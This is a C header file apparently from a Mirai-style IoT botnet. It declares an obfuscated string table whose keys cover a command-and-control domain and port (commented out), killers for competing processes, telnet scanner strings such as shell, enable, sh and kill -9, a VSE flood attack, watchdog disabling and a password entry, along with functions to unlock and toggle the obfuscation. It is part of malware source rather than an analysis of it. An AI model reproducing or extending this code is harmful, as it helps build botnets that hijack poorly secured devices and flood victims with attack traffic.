#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};
#define TABLE_EXEC_SUCCESS              1
//#define TABLE_CNC_DOMAIN                2
//#define TABLE_CNC_PORT                  3    
#define TABLE_KILLER_PROC               4
#define TABLE_KILLER_EXE                5
#define TABLE_KILLER_FD                 6 
//#define TABLE_KILLER_ANIME              7
#define TABLE_KILLER_MAPS             8       
#define TABLE_SCAN_SHELL                9 
#define TABLE_SCAN_ENABLE               10  
#define TABLE_SCAN_SYSTEM               11  
#define TABLE_SCAN_SH                   12
#define TABLE_SCAN_QUERY                13  
#define TABLE_SCAN_RESP                 14 
#define TABLE_SCAN_NCORRECT             15  
#define TABLE_SCAN_PS                   16  
#define TABLE_SCAN_KILL_9               17 
#define TABLE_ATK_VSE                   18
#define TABLE_MISC_WATCHDOG 19
#define TABLE_MISC_WATCHDOG2 20
#define TABLE_MISC_RAND 21
#define TABLE_MEM_ROUTE 22
#define TABLE_MEM_ASSWORD 23
#define TABLE_KILLER_TCP 24
#define TABLE_MAX_KEYS  25

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
